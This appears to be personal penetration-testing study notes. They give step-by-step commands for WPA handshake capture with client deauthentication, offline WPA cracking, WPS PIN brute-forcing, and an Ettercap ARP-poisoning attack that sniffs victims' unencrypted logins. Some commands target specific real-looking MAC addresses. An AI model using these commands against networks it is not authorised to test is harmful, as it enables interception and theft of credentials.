PENTESTING:PENETRATION TESTING CHEAT SHEET BY GV

Based on book:
Penetration Testing - A hands-on introduction to Hacking by Georgia Weidman

##Wifi PenTesting
aircrack-ng is required - available by apt install under Debian.

.B Steps 
$ airmon-ng check
$ airmon-ng check kill                 # kill all processes interfering with wlan0 : NetworkManager and wpa_supplicant
$ airmon-ng start wlan0                # disables wlan0 and installs a virtual device wlan0mon in monitor mode
$ airodump-ng wlan0mon --channel 11    # wlan0 will gather all wireless packets from all nearby APs

.B Restoring:
$ airmon-ng stop wlan0mon # will remove the temp virtual wlan0mon and re-enable wlan0
$ NetworkManager          # will re-enable network manager and wpa_supplicant. Alternative : $ service network-manager start

.B Tips:
https://www.aircrack-ng.org/doku.php?id=airodump-ng
My rtl8723be under Debian seems not to capture anything. 
You need a WiFi adapter capable to operate in monitor mode and you also need drivers (usually customized) that will make use of the monitor mode.

$ iw list         # will provide info about wlan0  including supported modes:
......
......
Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor
                 * mesh point
                 * P2P-client
                 * P2P-GO
.......
.......

 
$ iwconfig                        # show info about current session of wlan - includes active mode (monitor/managed) 
$ ifconfig wlan0 down             # Brings down the wlan0 - required before setting any modes - it seems that when mode is managed this is ignored.
$ iwconfig wlan0 mode monitor     # Force wlan0 to be in monitor mode. I was expecting airodump-ng wlan0 to work
$ iwconfig wlan0mon mode monitor  # Forcing monitor mode - Shouldn't aircrack supposed to do that...? 
$ iwconfig wlan0 mode managed     # Should be this mode in order NetworkManager do it's job
$ ifconfig wlan0 up               # Bring wlan0 up
$ iw wlan0 set power_save off     # disables power save
$ alias stopwlan0monitor='ifconfig wlan0 down && sleep 1 && iwconfig wlan0 mode managed && sleep 1 && ifconfig wlan0 up && sleep 1 && NetworkManager'

$ nano /etc/NetworkManager/NetworkManager.conf                    # Tweaking network manager conf file
[keyfile]                                                         # Add this line and the next one in conf file
unmanaged-devices=interface-name:wlan0mon;interface-name:wlan1mon # with this tweak you don't need to kill networkmanager (untested)


## Customized rtl8723be drivers:
https://github.com/lwfinger/rtlwifi_new
https://forums.kali.org/showthread.php?22638-rtl8723be-wireless-driver-installation
http://www.aircrack-ng.org/doku.php?id=compat-wireless


## Alternative approach that worked:
$ iwconfig              # managed mode, connected to my home wifi
$ airmon-ng check kill  # killing network manager
$ ifconfig wlan0 down   # bring down the wlan0
$ aireplay-ng -9 wlan0    # -9 is a short code for injection testing- It seems that automatically brings up wlan0 on monitor mode
Among other is get a message :
........
00:29:34  Injection is working!
........
APs info
..........

$ iwconfig
wlan0     IEEE 802.11  Mode:Monitor  Frequency:2.467 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr=2347 B   Fragment thr:off
          Power Management:off

$ airodump-ng wlan0 --channel 11 # WORKED FINE - It seems that defining a channel works better. But it worked either without --channel
To restore use alias exitmonitor (see above)

##Capturing packets
Next we need to capture some packages by the desired router.
We need two terminal windows for this operation.

.B Terminal 1:
$ airodump-ng --channel 1 --bssid D0:60:8C:06:71:86 -w /home/gv/Desktop/ wlan0  # -w: write to /home/gv/Desktop/  
CH  1 ][ Elapsed: 4 mins ][ 2018-02-18 02:44 ][ WPA handshake: D0:60:8C:06:71:86                                         
                                                                                                                                     
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                     
 D0:60:8C:06:71:86  -83  27      939       14    0   1  54e  WPA2 CCMP   PSK  COSMOTE-067186                                         
                                                                                                                                     
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                           
                                                                                                                                     
 D0:60:8C:06:71:86  7C:0B:C6:54:85:08  -85    1e- 1e     0        2                                                                   
 D0:60:8C:06:71:86  EC:9B:F3:A1:C5:1D   -1    1e- 0      0        2                                                                   
 D0:60:8C:06:71:86  62:E3:27:80:03:3E  -79    1e- 1e     0      289  COSMOTE-067186                                                   
 D0:60:8C:06:71:86  62:E3:27:97:1C:34  -81    0 - 1      0        4                                                                   
 D0:60:8C:06:71:86  66:E3:27:F0:14:0A  -81    0 - 1      0        3                                                                   

.B Terminal 2:
You need to pick a client in order to kick him out of the rooter and force him to make a new handshake with the router.
$ aireplay-ng -0 1 -a <routermac> -c <clientmac> wlan0
$ aireplay-ng -0 1 -a D0:60:8C:06:71:86 -c 62:E3:27:80:03:3E wlan0
# You should see some info DeAuthentication of the client and reconnection

The job is finished if the message [ WPA handshake: D0:60:8C:06:71:86 appears on top of terminal 1
If this messaged is not shown, handshake is not capture and you need to keep kicking out the client.

Now that you have capture a handshake you can verify it with whireshark - open file - select the cap file and filter packets for eapol
You should see 4 messages = 4 way handshake. Sometimes, though that airodump claims that captured a handshake , you don't see 4 messages in wireshark. In this case you need to repeat the process.

##Cracking WPA Key
https://www.youtube.com/watch?v=CN61riNkmEU
Once you have a good .cap file with all 4 handshake messages you can attack (offline) to the cap file to decode the key.

$ aircrack-ng -a2 -b [router bssid] -w path/to/wordlist /path/to/capfile.cap  #Georgia skips -a2 (-a = attack mode, 2=WPA (1 is WEP))

##More Tips:
alias startwlan0monitor='airmon-ng check kill && ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up && aireplay-ng -9 wlan0 && airodump-ng wlan0'

1. http://aircrack-ng.org/doku.php?id=aircrack-ng#other_tips

2. aircrack-ng -w firstlist.txt,secondlist.txt,thirdlist.txt wpa2.eapol.cap  #providing three different word list files

3. john --stdout --wordlist=specialrules.lst --rules | aircrack-ng -e test -a 2 -w - /root/capture/wpa.cap  #attack using john the ripper

4. tshark -r <input file name> -R "eapol || wlan.fc.type_subtype == 0x08" -w <output file name>  #isolate/extract eapol 4way handshake to a smaller file

5. grep -E '^.{8,63}$' < inputfile  #WPA passwords are 8 to 63 chars long. This grep will skip passwords <8 or >63 chars.

##Finding/building a wordlist
http://www.aircrack-ng.org/doku.php?id=faq#where_can_i_find_good_wordlists
http://www.wirelesshack.org/wpa-wpa2-word-list-dictionaries.html
https://github.com/routerkeygen/routerkeygenPC
http://amitis1.blogspot.gr/2013/07/facebook.html
https://hashcat.net/forum/thread-6170.html
http://www.kalitutorials.net/2014/04/hack-wpawpa2-wps-reaver-kali-linux.html
http://to-markoutso.blogspot.gr/p/speedtouch-crack.html


Is quite common that people does not change the default PSK (pre shared key). 
We need some dictionaries including default PSKeys for various routers.

## Bruteforcing WPS Pin on Routers with WPS enabled
https://hackercool.com/2015/07/wpawpa2-password-cracking-with-bully/

$ bully -b F4:06:8D:6E:AC:4C -c 6 -B wlan0  #-b is the rooter mac, -c is the channel , -B stands for Bruteforce, wlan0 is the interface in use

Above bully run for an hour in target router with out result.

##Cracking WEP Encryption
Penetration Testing Book - page 347


PENTESTING - MITM / ARP POISONING
https://dotweak.com/2019/10/27/how-to-do-a-man-in-the-middle-attack-using-arp-poisoning-c1N3TGhyN21TNEtQUW9McURkYTY4dz09?fbclid=IwAR3pqyk49Bm4rTSmDOc1B14mVWuZuPsxTyGXSrIuFO5yjjfVbT0oVbF-Snk
A man-in-the-middle attack (MITM) is an attack where the attacker secretly relays and possibly alters the communications between 
two parties who believe they are directly communicating with each other. 
In this case, the victims think that they are communicating with each other, but in reality, the attacker is controlling the communication. 
A MITM attack can succeed only when the attacker impersonates each endpoint sufficiently well to satisfy their expectations.

##Ettercap Tool
Now that Ettercap is already installed in your machine, we will tweak a little bit of the configuration file of Ettercap to optimize the results provided by the tool.

sudo nano /etc/ettercap/etter.conf
The ec_uid and ec_gid lines must be set to 0 in order for the program service to work on behalf of the superuser:

[privs]
ec_uid = 0 # nobody is the default
ec_gid = 0 # nobody is the default

Then you need to find and uncomment these two lines:
redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"

Above line try to handle http as simple http. Be warned, all web sites that have provided a certificate will not be available (certificate error)

The program can work in several modes - with a graphical interface, without and as a service. We will consider work in the graphical interface. To run a program with a GTK interface, use the -G option:

sudo -E ettercap -G
We use the -E option for sudo to save all of our user's environment variables.

.B ARP poisoning Attack using Ettercap

This attack anatomy allows us to force the target computer to send packets to us instead to send it to the router.

Let us get to the point and execute the Ettercap ARP Poisoning Attack In Ettercap, click on the Sniff > Unified Sniffing and in the new popup select your network interface referenced in the below screenshot by wlp2s0.
It's now the time to scan the network and list the devices currently connected. In order to do it, simply click the hosts > scan for hosts. It will start scanning the whole network for the alive hosts. Once the scan is done, click again the hosts > hosts list to see the list of the hosts available in the network.

.B Important: 
This list also includes the default gateway address so we have to be careful when we select the targets

We will select the targets from our list of hosts. In a MITM attack, the attacker intercepts the network and sniffs the packets. 
In our man-in-the-middle scenario, our target machine is 192.168.1.104 and our router is 192.168.1.1. 
In Ettercap, just click to target 1 (192.168.1.104) and select (right click) add to target 1. 
Repeat the same with target 2 and select add to target 2.

click the Mitm > ARP poisoning and click OK. Thereafter, check the option Sniff remote connections and click OK.

Click start > start sniffing. This will start ARP poisoning in the network which means we have enabled our network card in promiscuous mode and now the local traffic can be sniffed.

Note: We have allowed only HTTP sniffing with Ettercap, so don’t expect HTTPS packets to be sniffed with this process. From this simple example, if our victim logged into some websites we will get the output into our Ettercap console.

The program is now sending packets to the network, with a request for 192.168.1.104 to update the ARP cache and replace the MAC address 
of the router with yours. The attack is started and successfully executed. 
You can open the View -> Connections menu and see the active connections for the target device.

If a packet is sent through the network without encryption method, then we can view the transmitted information by clicking on the connection row. 
The informations sent are displayed on the left side, and the informations received are displayed on the right.

Any sensitive information, such as the data passed through a login form, a registration form, a contact form, etc ... as long they are not 
encrypted, can be parsed by the attacker examining the content of every rows and them values.
